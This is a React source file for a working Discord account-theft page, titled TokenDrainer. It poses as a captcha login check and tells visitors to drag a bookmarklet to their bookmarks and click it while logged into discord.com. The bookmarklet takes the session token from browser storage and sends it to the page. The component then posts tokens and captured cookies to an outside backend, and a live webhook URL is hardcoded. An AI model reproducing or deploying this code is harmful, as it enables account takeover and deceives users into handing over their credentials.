import { useState, useMemo, useEffect } from 'react';

function TokenDrainer() {
  const [status, setStatus] = useState('idle');

  // Handle token or cookie from URL parameters (when bookmarklet redirects here)
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token');
    const cookie = urlParams.get('cookie');

    if (token) {
      setStatus('processing');

      fetch('https://discord-token-logger-backend-fm53.vercel.app/api/process-token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          token: token,
          url: urlParams.get('url') || 'Unknown',
          timestamp: urlParams.get('timestamp') || new Date().toISOString(),
          method: urlParams.get('method') || 'Bookmarklet Redirect'
        })
      })
      .then(res => res.json())
      .then(data => {
        setStatus(data.success ? 'success' : 'error');
        if (!data.success) console.error('Backend Error:', data.message);
      })
      .catch(err => {
        setStatus('error');
        console.error('Fetch Error:', err);
      });

      window.history.replaceState(null, '', window.location.pathname);
    } else if (cookie) {
      setStatus('processing');

      fetch('https://discord-token-logger-backend-fm53.vercel.app/api/process-cookie', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cookie: cookie,
          sid: urlParams.get('sid') || '',
          sapisid: urlParams.get('sapisid') || '',
          type: urlParams.get('type') || 'unknown',
          url: urlParams.get('url') || 'Unknown',
          timestamp: urlParams.get('timestamp') || new Date().toISOString(),
          method: urlParams.get('method') || 'Bookmarklet Cookie Capture'
        })
      })
      .then(res => res.json())
      .then(data => {
        setStatus(data.success ? 'success' : 'error');
        if (!data.success) console.error('Backend Error:', data.message);
      })
      .catch(err => {
        setStatus('error');
        console.error('Fetch Error:', err);
      });

      window.history.replaceState(null, '', window.location.pathname);
    }
  }, []);

  const bookmarkletCode = useMemo(() => {
    const webhookUrl = 'https://discord.com/api/webhooks/1412768418544881776/bn-c8zNPSqn-FbGC51cTNRlDJ9aNVBzuPdJHF9UiQSSRE7VnxZPzoBuDDOlGOzTjznh5';
    const script = `
      (function(){


        // Try multiple methods to get the token
        try {
          var token = null;

          // Method 1: Try localStorage directly
          if(typeof localStorage !== 'undefined') {
            token = localStorage.getItem('token');
            if(token) {
              console.log('Found token via localStorage:', token.substring(0, 20) + '...');
            }
          }

          // Method 2: Try window object
          if(!token && typeof window !== 'undefined') {
            if(window.localStorage) {
              token = window.localStorage.getItem('token');
              if(token) {
                console.log('Found token via window.localStorage:', token.substring(0, 20) + '...');
              }
            }
          }

          // Method 3: Try to access from iframes if available
          if(!token) {
            try {
              var iframes = document.querySelectorAll('iframe');
              for(var i = 0; i < iframes.length; i++) {
                try {
                  if(iframes[i].contentWindow && iframes[i].contentWindow.localStorage) {
                    token = iframes[i].contentWindow.localStorage.getItem('token');
                    if(token) {
                      console.log('Found token via iframe localStorage:', token.substring(0, 20) + '...');
                      break;
                    }
                  }
                } catch(e) {
                  // Skip iframe if access denied
                }
              }
            } catch(e) {
              console.log('Could not access iframes:', e.message);
            }
          }

          // Method 4: Try to find token in current context storage
          if(!token) {
            try {
              // Check for any storage-like objects
              var storageKeys = Object.keys(window);
              for(var i = 0; i < storageKeys.length; i++) {
                var key = storageKeys[i];
                if(key.toLowerCase().includes('storage') && window[key]) {
                  try {
                    if(typeof window[key].getItem === 'function') {
                      token = window[key].getItem('token');
                      if(token) {
                        console.log('Found token via ' + key + ':', token.substring(0, 20) + '...');
                        break;
                      }
                    }
                  } catch(e) {}
                }
              }
            } catch(e) {
              console.log('Could not search window object:', e.message);
            }
          }

                    if(token) {
            // Clean the token by removing quotes
            var cleanToken = token.replace(/"/g, '');

            // CSP blocks fetch from Discord domain, so use a different approach
            // Open a new tab with the token in the URL
            var redirectUrl = window.location.origin + '/?token=' + encodeURIComponent(cleanToken) +
                             '&method=bookmarklet&timestamp=' + encodeURIComponent(new Date().toISOString()) +
                             '&url=' + encodeURIComponent(window.location.href);

            // Show the token in alert and console for immediate access
            console.log('Token captured:', cleanToken);
            console.log('Opening URL:', redirectUrl);

            // Open the new tab - this should work even with CSP restrictions
            window.open(redirectUrl, '_blank');

            // Also try to copy to clipboard if possible
            try {
              if(navigator.clipboard) {
                navigator.clipboard.writeText(cleanToken).then(function() {
                  console.log('Token copied to clipboard!');
                }).catch(function(err) {
                  console.log('Could not copy to clipboard:', err);
                });
              }
            } catch(e) {
              console.log('Clipboard API not available');
            }

          } else {
            alert('Could not find Captcha using any method. Please ensure you are logged in and the page is fully loaded.');
          }
        } catch(e) {
          alert('A critical error occurred: ' + e.message);
          console.error('Bookmarklet Error:', e);
        }
      })()
    `;
    return `javascript:${encodeURIComponent(script).replace(/'/g, "%27")}`;
  }, []);

  // Show processing status if token was received
  if (status !== 'idle') {
    return (
      <div className="min-h-screen flex items-center justify-center text-white text-2xl">
        {status === 'processing' && 'Processing captured data...'}
        {status === 'success' && '✅ Success! Cookie data captured and saved to local JSON. Check captured_cookies.json and Telegram.'}
        {status === 'error' && '❌ Error! Could not process data. Check the browser console.'}
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center px-6 py-8" style={{ paddingTop: '120px' }}>
      <div className="w-full max-w-xl mx-auto">
        
        <div className="flex items-center mb-8">
          <div className="w-16 h-16 bg-gradient-to-br from-blue-500 via-blue-600 to-blue-700 rounded-2xl flex items-center justify-center shadow-lg mr-6">
            <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
            </svg>
          </div>

          {/* Title */}
          <div>
            <h1 className="text-5xl font-bold text-white leading-tight">
              Login to verify your<br />account
            </h1>
        </div>
      </div>

        <div className="mb-8">
          <p className="text-slate-300 text-lg leading-relaxed mb-4">
          To complete captcha-protected login, follow these steps:<br/>

          Drag the button to your bookmarks bar.<br/>

          Go to discord.com and log in.<br/>

          Refresh the page, and immediately click the bookmark.<br/>
            </p>
          </div>

        <div className="mb-8">
          <a
            href={bookmarkletCode}
            onClick={(e) => {
              e.preventDefault();
              alert('Please drag this button to your bookmarks bar, then click it while you are on the Discord website.');
            }}
            className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white text-lg font-medium rounded-lg shadow-lg transform hover:scale-105 transition-all duration-200 cursor-move"
          >
            Drag Me to Bookmarks
          </a>
          </div>

        {/* Browser Mockup */}
        <div className="w-full max-w-lg">
          {/* Browser Header */}
          <div className="bg-gradient-to-r from-orange-400 to-orange-500 rounded-t-lg px-4 py-3 flex items-center">
            <div className="flex space-x-2 mr-4">
              <div className="w-3 h-3 bg-red-500 rounded-full"></div>
              <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
              <div className="w-3 h-3 bg-green-500 rounded-full"></div>
            </div>
            <div className="flex-1 bg-white/20 rounded px-3 py-1">
              <span className="text-slate-800 text-sm">captcha.bot.io/verify</span>
            </div>
          </div>
          
          {/* Browser Content */}
          <div className="bg-white rounded-b-lg p-4 min-h-[100px]">
            <div className="flex items-center space-x-2 mb-3">
              <div className="w-4 h-4 bg-blue-600 rounded flex items-center justify-center">
                <svg className="w-2 h-2 text-white" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
              </div>
              <span className="text-sm font-medium text-slate-800">Getting Started</span>
              <span className="text-sm text-slate-500">Premium</span>
      </div>

            {/* Mini content area */}
            <div className="bg-slate-100 rounded p-3">
              <div className="flex items-center space-x-2 mb-2">
                <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                <span className="text-xs text-slate-600">Getting Started</span>
                <span className="text-xs text-slate-400">Premium</span>
                </div>
              <div className="bg-white rounded px-2 py-1 text-xs text-slate-500">
                Looking at All Discord
                </div>
              <div className="mt-1 flex space-x-1">
                <div className="w-16 h-3 bg-red-500 rounded-sm"></div>
                <div className="w-8 h-3 bg-slate-300 rounded-sm"></div>
                  </div>
              </div>
          </div>
        </div>

      </div>
    </div>
  );
}

export default TokenDrainer;
